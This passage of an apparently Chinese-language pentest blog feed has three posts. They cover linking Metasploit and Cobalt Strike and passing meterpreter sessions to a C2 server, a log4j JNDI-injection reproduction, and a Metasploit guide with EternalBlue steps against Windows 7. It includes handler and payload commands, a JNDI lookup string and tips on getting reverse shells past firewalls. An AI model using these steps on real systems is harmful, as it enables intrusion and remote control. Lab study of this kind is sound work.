alt="image-20250211150412071"></p><h1 id="四、MSF和CS联动"><a href="#四、MSF和CS联动" class="headerlink" title="四、MSF和CS联动"></a>四、MSF和CS联动</h1><p>实际上就是一个流量的转发 </p><p><strong>注意一点</strong>：在实际攻击中cs的服务器肯定是在一台公网上的服务器上我建议无论啥时候要联动的话直接把msf和c2服务器放在一台服务器上 这样一方面不用再去专门的配置端口转发还有防火墙的策略另一方面shell流量转来转去可能导致连接不是很稳定</p><p>同时建议使用http或者https来建立回连的会话通过网关以及防火墙的概率比较高。</p><p>注：http对应http，，https对应https 啥意思呢 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162012236.png" alt="屏幕截图 2025-02-16 200549"></p><p>地址填C2的地址 端口对应上msf上的端口就行</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162012679.png" alt="image-20250216201222625"></p><p>针对最下面的两个Foreign是用来与外部应用来进行联动的（流量转发） </p><p>步骤：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">1.<span class="hljs-keyword">cs</span>配置外部监听器 <br>2.到c2所在的服务器上使用命令msfconsole<br><span class="hljs-keyword">use</span> exploit/multi/handler<br><span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http （注意区分http还是https）<br><span class="hljs-keyword">set</span> lhost <span class="hljs-keyword">CS</span>的服务器地址<br><span class="hljs-keyword">set</span> lport <span class="hljs-keyword">CS</span>外联监听器的端口(此处应为4441)<br><span class="hljs-keyword">run</span><br>3.<span class="hljs-keyword">cs</span>指定会话里运行spawn 外联监听器名<br></code></pre></td></tr></table></figure><p>如图：[当出现红色方框中的东西时表示已经回连成功 绿色方框里是命令]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162140024.png" alt="屏幕截图 2025-02-16 213630"></p><p>退出输入exit即可</p><h1 id="五、MSF复制会话到CS"><a href="#五、MSF复制会话到CS" class="headerlink" title="五、MSF复制会话到CS"></a>五、MSF复制会话到CS</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">首先针对我所遇到的一系列问题进行总结这次实验环境我使用的通过永恒之蓝来实现对win7主机的操控</span><br><span class="hljs-string">先来说说msf中的几个脚本的区别（当我们search</span> <span class="hljs-string">ms17-010后我们会先查找到多个漏洞脚本）</span><br>   <span class="hljs-comment">#   Name                                           Disclosure Date  Rank     Check  Description</span><br>   <span class="hljs-bullet">-</span>   <span class="hljs-string">----</span>                                           <span class="hljs-string">---------------</span>  <span class="hljs-string">----</span>     <span class="hljs-string">-----</span>  <span class="hljs-string">-----------</span><br>   <span class="hljs-number">0</span>   <span class="hljs-string">exploit/windows/smb/ms17_010_eternalblue</span>       <span class="hljs-number">2017-03-14       </span><span class="hljs-string">average</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">MS17-010</span> <span class="hljs-string">EternalBlue</span> <span class="hljs-string">SMB</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kernel</span> <span class="hljs-string">Pool</span> <span class="hljs-string">Corruption</span><br>   <span class="hljs-number">1</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Automatic</span> <span class="hljs-string">Target</span>                  <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">2</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">7</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">3</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Embedded</span> <span class="hljs-string">Standard</span> <span class="hljs-number">7</span>       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">4</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">5</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">8</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">6</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">8.1</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">7</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">8</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-string">Pro</span>                    <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">9</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-string">Enterprise</span> <span class="hljs-string">Evaluation</span>  <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">10</span>  <span class="hljs-string">exploit/windows/smb/ms17_010_psexec</span>            <span class="hljs-number">2017-03-14       </span><span class="hljs-string">normal</span>   <span class="hljs-literal">Yes</span>    <span class="hljs-string">MS17-010</span> <span class="hljs-string">EternalRomance/EternalSynergy/EternalChampion</span> <span class="hljs-string">SMB</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Code</span> <span class="hljs-string">Execution</span><br>   <span class="hljs-number">11</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Automatic</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">12</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PowerShell</span>                        <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">13</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Native</span> <span class="hljs-string">upload</span>                     <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">14</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">MOF</span> <span class="hljs-string">upload</span>                        <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">15</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALSYNERGY</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">16</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALROMANCE</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">17</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALCHAMPION</span>                      <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">18</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALBLUE</span>                          <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">19</span>  <span class="hljs-string">auxiliary/admin/smb/ms17_010_command</span>           <span class="hljs-number">2017-03-14       </span><span class="hljs-string">normal</span>   <span class="hljs-literal">No</span>     <span class="hljs-string">MS17-010</span> <span class="hljs-string">EternalRomance/EternalSynergy/EternalChampion</span> <span class="hljs-string">SMB</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Execution</span><br>   <span class="hljs-number">20</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALSYNERGY</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">21</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALROMANCE</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">22</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALCHAMPION</span>                      <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">23</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALBLUE</span>                          <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">24</span>  <span class="hljs-string">auxiliary/scanner/smb/smb_ms17_010</span>             <span class="hljs-string">.</span>                <span class="hljs-string">normal</span>   <span class="hljs-literal">No</span>     <span class="hljs-string">MS17-010</span> <span class="hljs-string">SMB</span> <span class="hljs-string">RCE</span> <span class="hljs-string">Detection</span><br>   <span class="hljs-number">25</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">DOUBLEPULSAR</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">26</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALBLUE</span>                          <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">27</span>  <span class="hljs-string">exploit/windows/smb/smb_doublepulsar_rce</span>       <span class="hljs-number">2017-04-14       </span><span class="hljs-string">great</span>    <span class="hljs-literal">Yes</span>    <span class="hljs-string">SMB</span> <span class="hljs-string">DOUBLEPULSAR</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Code</span> <span class="hljs-string">Execution</span><br>   <span class="hljs-number">28</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Execute</span> <span class="hljs-string">payload</span> <span class="hljs-string">(x64)</span>             <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">29</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Neutralize</span> <span class="hljs-string">implant</span>                <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <br><span class="hljs-number">1</span><span class="hljs-string">.先来说说各个模块的意思</span><br><span class="hljs-string">Name</span><span class="hljs-string">模块名称（如</span> <span class="hljs-string">ms17_010_eternalblue）</span><br><span class="hljs-string">Disclosure</span> <span class="hljs-string">Date</span><span class="hljs-string">漏洞公开日期（2017-03-14</span> <span class="hljs-string">对应</span> <span class="hljs-string">MS17-010</span> <span class="hljs-string">补丁日）</span><br><span class="hljs-string">Rank</span><span class="hljs-string">模块稳定性评级：</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">average/great（高成功率）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">normal（需特定条件）</span><br><span class="hljs-string">Check</span><span class="hljs-string">是否支持漏洞检测（Yes</span> <span class="hljs-string">表示模块自带检测逻辑，No</span> <span class="hljs-string">需手动验证）。</span><br><span class="hljs-string">Description</span><span class="hljs-string">模块功能简介（如攻击原理或检测能力）。</span><br><br><br><span class="hljs-number">2</span><span class="hljs-string">.然后是具体的模块的分类以及名称</span><br><span class="hljs-string">exploit/windows/smb/ms17_010_eternalblue</span><span class="hljs-string">利用永恒之蓝漏洞（EternalBlue）攻击未打补丁的</span> <span class="hljs-string">Windows</span> <span class="hljs-string">系统，漏洞利用类</span> <span class="hljs-string">触发内核级远程代码执行（RCE）。</span><br>    <span class="hljs-string">exploit/windows/smb/ms17_010_psexec</span><span class="hljs-string">利用EternalRomance/Synergy/Champion漏洞通过SMB服务上传并执行恶意负载</span><br>    <br><span class="hljs-string">辅助利用类</span><span class="hljs-string">auxiliary/admin/smb/ms17_010_command</span><span class="hljs-string">在已验证漏洞存在时，直接通过</span> <span class="hljs-string">SMB</span> <span class="hljs-string">执行系统命令（无需上传</span> <span class="hljs-string">Payload）</span><br><span class="hljs-string">漏洞扫描类</span><span class="hljs-string">auxiliary/scanner/smb/smb_ms17_010</span><span class="hljs-string">检测目标是否受</span> <span class="hljs-string">MS17-010</span> <span class="hljs-string">漏洞影响（支持批量扫描）。</span><br><span class="hljs-string">双星后门利用类</span><span class="hljs-string">exploit/windows/smb/smb_doublepulsar_rce</span><span class="hljs-string">利用</span> <span class="hljs-string">DOUBLEPULSAR</span> <span class="hljs-string">后门（植入后）执行代码或清除后门。</span><br><br><br><span class="hljs-number">3</span><span class="hljs-string">.最后是</span><br><span class="hljs-string">（1）目标选项（Target）</span><br><span class="hljs-string">作用：指定目标操作系统版本或攻击模式，确保</span> <span class="hljs-string">Payload</span> <span class="hljs-string">兼容性。</span><br><span class="hljs-string">用法：若攻击Windows</span> <span class="hljs-number">7</span><span class="hljs-string">，需指定set</span> <span class="hljs-string">target</span> <span class="hljs-number">2</span><span class="hljs-string">（对应Windows</span> <span class="hljs-number">7</span><span class="hljs-string">条目）。</span><br><span class="hljs-string">示例：</span><br><span class="hljs-string">Windows</span> <span class="hljs-number">7</span><span class="hljs-string">：针对</span> <span class="hljs-string">Win7</span> <span class="hljs-string">系统优化攻击链。</span><br><span class="hljs-string">PowerShell：通过</span> <span class="hljs-string">PowerShell</span> <span class="hljs-string">上传和执行</span> <span class="hljs-string">Payload。</span><br><span class="hljs-string">Neutralize</span> <span class="hljs-string">implant：清除</span> <span class="hljs-string">DOUBLEPULSAR</span> <span class="hljs-string">后门。</span><br><span class="hljs-string">（2）别名（AKA）</span><br><span class="hljs-string">含义：模块关联的漏洞别名或攻击代号。</span><br><span class="hljs-string">用法：通过set</span> <span class="hljs-string">AKA</span> <span class="hljs-string">ETERNALROMANCE可切换利用链中的不同攻击逻辑</span><br><span class="hljs-string">ETERNALBLUE：永恒之蓝（内核漏洞）。</span><br><span class="hljs-string">DOUBLEPULSAR：NSA</span> <span class="hljs-string">泄露的后门工具，与</span> <span class="hljs-string">EternalBlue</span> <span class="hljs-string">配合使用。</span><br></code></pre></td></tr></table></figure><p>首先使用msf利用永恒之蓝的漏洞get到回连的shell如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182037898.png" alt="image-20250218203752585"></p><p>然后使用background先将其放到后台然后可以使用sessions -l来查看会话id</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182042377.png" alt="image-20250218204241276"></p><p>然后进行注入会话（注意如果要实现以下这些功能的话是需要你去<strong>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</strong>而不是以上图片中的）<br>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject  这个模块是一个 Windows 本地漏洞利用模块，它允许你注入一个有效的 payload 到目标系统。       这个模块通常用于通过本地权限提升攻击进行绕过限制并获得更高权限。它可以通过注入 payload 来逃避一些本地防护措施。</p><p>session 选择要复制的session会话id<br>set payload windows&#x2F;meterpreter&#x2F;reverse_http<br>set lhost cs服务器地址<br>set lport cs外联监听器的端口(此处应为4442)</p><p>CS创建监听器</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182110235.png" alt="image-20250218211031149"></p><p>MSF运行注入run</p><p>然后再cs上即可返回到会话</p><h2 id="CS监听器的原理"><a href="#CS监听器的原理" class="headerlink" title="CS监听器的原理"></a>CS监听器的原理</h2><p><strong>Beacon类</strong>：</p><ul><li>通常用于标准的渗透测试，使用常见的通信协议（如HTTP、HTTPS、DNS等）与C2进行通信。</li><li>适用于大多数网络环境，并能够通过加密、定时轮询等方式隐蔽流量。（轮询是指目标计算机上的beacon会周期性的向c2服务区发送请求 检查是否有新的指令或者数据 [其中的周期性在cobaltstrike就是sleep 设置的心跳] ）</li></ul><p><strong>External类</strong>：</p><ul><li>使用外部协议或自定义协议，与外部C2服务器进行通信。</li><li>主要用于规避网络监控，适合对抗先进的防火墙和IDS系统。</li></ul><p><strong>Foreign类</strong>：</p><ul><li>专注于通过模仿外部流量（如外部的HTTP&#x2F;HTTPS请求）来伪装Cobalt Strike的C2流量。</li><li>适用于需要极高隐蔽性和绕过基于流量模式检测的场景。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache log4j 2 JNDI注入漏洞复现</title>
    <link href="/2024/11/14/Apache%20log4j%202%20JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/11/14/Apache%20log4j%202%20JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-44228复现"><a href="#CVE-2021-44228复现" class="headerlink" title="CVE-2021-44228复现"></a>CVE-2021-44228复现</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>Apache log4j 2是一个Java的日志记录工具通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地 为控制台、文件、GUI组件等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p><h2 id="大致原理："><a href="#大致原理：" class="headerlink" title="大致原理："></a>大致原理：</h2><p>log4j2中存在<strong>JNDI注入漏洞</strong>，log4j2会将用户输入的内容记录到日志当中，如果输入特殊字符串  会被log4j2解析然后调用JNDI接口中的lookup方法 从而会远程下载恶意代码并执行</p><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>JNDI（Java Naming and Directory Interface）是Java提供的一个标准接口，用于让应用程序能够方便地访问不同的命名和目录服务，比如LDAP、DNS等。它帮助Java应用程序通过统一的方式和不同的命名服务进行交互。**[LDAP是一种限制去访问其他目录以及外部资源的一种协议]**</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a><strong>JNDI注入</strong></h2><p>是一种攻击方式，利用了JNDI接口的特点，让攻击者能够通过它执行远程代码。通俗地说，就是攻击者可以欺骗程序，让它从攻击者控制的服务器上下载并执行恶意代码。</p><p>因为JNDI默认是建立在信任的基础上这意味着，一旦程序通过JNDI获取了一个对象或类，它会自动执行这个对象或类的代码</p><p><strong>举个例子</strong>：</p><ol><li>正常情况下，程序会通过JNDI从一个合法的服务器上下载所需的代码或数据。</li><li>但是，如果存在安全漏洞，攻击者可以通过操纵JNDI的请求，告诉程序去连接到攻击者控制的恶意服务器。</li><li>当程序连接到这个恶意服务器时，它会下载并执行攻击者的恶意代码，从而让攻击者在受害者的系统上运行任意代码，甚至完全控制系统。</li></ol><p>在 JNDI 注入攻击中，常用的攻击方式包括通过 <strong>RMI（远程方法调用）</strong> 和 <strong>LDAP（轻量级目录访问协议）</strong> 这两种服务。它们允许程序通过网络访问远程的资源，但在漏洞中，被攻击者利用来提供恶意代码。</p><p>在这个漏洞中就是利用了LDAP</p><h2 id="漏洞详细原理"><a href="#漏洞详细原理" class="headerlink" title="漏洞详细原理"></a>漏洞详细原理</h2><p>Log4j 之所以会解析类似于 <code>$&#123;jndi:rmi:192.168.23.134:1099/exp&#125;</code> 这样的字符串，主要是因为它提供了<strong>动态变量替换</strong>的功能。这种功能使得 Log4j 不仅仅是一个简单的日志记录工具，它能够根据日志消息的内容动态地解析和处理特定格式的字符串。</p><h3 id="1-动态变量替换"><a href="#1-动态变量替换" class="headerlink" title="1. 动态变量替换"></a>1. 动态变量替换</h3><ul><li>Log4j 支持在日志消息中使用变量和格式化信息。通过 <code>$&#123;&#125;</code> 语法，Log4j 可以将特定的内容替换为实际值。例如，你可以在日志中引用系统属性、环境变量或其他上下文信息。</li></ul><h3 id="2-JNDI-查找支持"><a href="#2-JNDI-查找支持" class="headerlink" title="2. JNDI 查找支持"></a>2. JNDI 查找支持</h3><ul><li>Log4j2 引入了对 JNDI 的支持，使得应用程序可以在日志中引用 JNDI 查找。这样，当日志消息中包含 <code>$&#123;jndi:...&#125;</code> 的时候，Log4j 会尝试执行 JNDI 查找，以获取相关对象。这使得开发者能够灵活地使用外部资源，但也因此引入了安全风险。</li></ul><h3 id="3-解析和执行"><a href="#3-解析和执行" class="headerlink" title="3. 解析和执行"></a>3. 解析和执行</h3><ul><li>当 Log4j 处理日志消息时，它会检查消息内容。如果发现 <code>$&#123;jndi:...&#125;</code> 这样的结构，它会调用 JNDI API 来执行查找。这个过程是动态的，Log4j 会连接到指定的 JNDI 服务（如 LDAP）而<code>$&#123;jndi:rmi:...&#125;</code>就是调用JNDI API来执行查找并且指定里了LDAP服务，然后就会获取返回的对象。</li><li>如果返回的对象是一个 Java 类，Log4j 就会加载并执行它，这就是导致远程代码执行（RCE）漏洞的原因</li></ul><h2 id="拓展-Log4j"><a href="#拓展-Log4j" class="headerlink" title="拓展 Log4j"></a>拓展 Log4j</h2><p>Log4j 作为一个日志记录工具，提供解析和执行功能的原因主要是为了增强灵活性和扩展性，使得开发者能够根据实际需求动态生成和处理日志信息。下面是一些原因和具体的例子，说明为什么一个日志工具可能需要这些功能。</p><h3 id="1-动态生成日志信息"><a href="#1-动态生成日志信息" class="headerlink" title="1. 动态生成日志信息"></a>1. 动态生成日志信息</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><ul><li>允许开发者在日志中插入动态值，比如用户信息、环境变量、系统状态等，从而使日志更具上下文和可读性。</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>假设一个 web 应用程序需要记录用户的登录活动，开发者可以在日志消息中使用动态变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.info(<span class="hljs-string">&quot;User &#123;&#125; logged in from IP: &#123;&#125;&quot;</span>, username, ipAddress);<br></code></pre></td></tr></table></figure><p>在这条日志记录中，<code>&#123;&#125;</code> 会被替换为 <code>username</code> 和 <code>ipAddress</code> 的实际值。这样，记录的日志将包含用户的具体信息，方便后续审计和分析。</p><h3 id="2-使用外部资源"><a href="#2-使用外部资源" class="headerlink" title="2. 使用外部资源"></a>2. 使用外部资源</h3><h4 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h4><ul><li>允许从外部服务或资源获取数据，这样可以在日志中包含实时信息或相关对象。例如，获取配置值、统计信息或状态报告。</li></ul><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>如果一个应用程序希望在日志中记录当前数据库连接的状态，可以通过 JNDI 查找获取相应的状态信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.info(<span class="hljs-string">&quot;Current database connection: &#123;&#125;&quot;</span>, context.lookup(<span class="hljs-string">&quot;java:comp/env/jdbc/MyDataSource&quot;</span>));<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>lookup</code> 方法会查询命名服务并获取数据库连接对象的状态信息。这样，日志不仅可以记录信息，还可以提供上下文。</p><h3 id="3-灵活的日志记录"><a href="#3-灵活的日志记录" class="headerlink" title="3. 灵活的日志记录"></a>3. 灵活的日志记录</h3><h4 id="目的-2"><a href="#目的-2" class="headerlink" title="目的"></a>目的</h4><ul><li>根据不同的上下文和配置动态调整日志内容。例如，开发者可能希望在某些条件下记录额外的信息。</li></ul><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>在处理异常时，开发者可能希望在日志中记录更多的信息，如当前用户的上下文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 可能抛出异常的代码</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    logger.error(<span class="hljs-string">&quot;An error occurred for user &#123;&#125;: &#123;&#125;&quot;</span>, currentUser, e.getMessage());<br>&#125;<br></code></pre></td></tr></table></figure><p>这里，<code>currentUser</code> 是动态获取的用户信息，这样的日志记录可以帮助开发者快速定位问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因此，Log4j 提供的解析和执行功能是为了增强日志记录的灵活性和实用性。虽然这些功能为开发者提供了更强大的工具，但也带来了安全风险。例如，如果日志输入未经过滤，攻击者可以利用这些动态功能执行恶意代码。为了安全，开发者在使用这些功能时需要谨慎，并确保输入被正确验证和清理。</p>]]></content>
    
    
    
    <tags>
      
      <tag>cve复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSF使用以及相关后续部分渗透思路</title>
    <link href="/2024/11/14/msf%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/11/14/msf%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="MSF使用-以及相关的git"><a href="#MSF使用-以及相关的git" class="headerlink" title="MSF使用 以及相关的git"></a>MSF使用 以及相关的git</h1><h2 id="1-MSF是啥"><a href="#1-MSF是啥" class="headerlink" title="1.MSF是啥"></a>1.MSF是啥</h2><p>Metasploit Framework(MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持<br>持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。</p><p>[<strong>这个工具不是像Ruby那种用来批量漏扫的工具这个工具是在你确定或者怀疑目标系统存在某个CVE或者其他什么漏洞的前提下使用特定模块进行针对</strong>]</p><h2 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2.使用方法"></a>2.使用方法</h2><ul><li>进入框架： msfconsole</li><li>使用search命令查找相关漏洞：search ms17-010</li><li>使用use进入模块:use exploit&#x2F;windows&#x2F;smb&#x2F;ms17 010eternalblue</li><li>使用info查看模块信息: info</li><li>设置攻击载荷: set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse tcp</li><li>查看模块需要配置的参数: show options</li><li>设置参数:set RHOST192.168.125138 （远程的攻击地址）</li><li>攻击: exploit&#x2F; run</li><li>后渗透阶段<br>  不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。<br>  我们也可以将攻击代码写入 configure.rc (只要是以.rc结尾的文件)配置文件中，然后使用命令msfconsole r<br>  configure.rc进行自动攻击!</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411142127304.png" alt="屏幕截图 2024-11-14 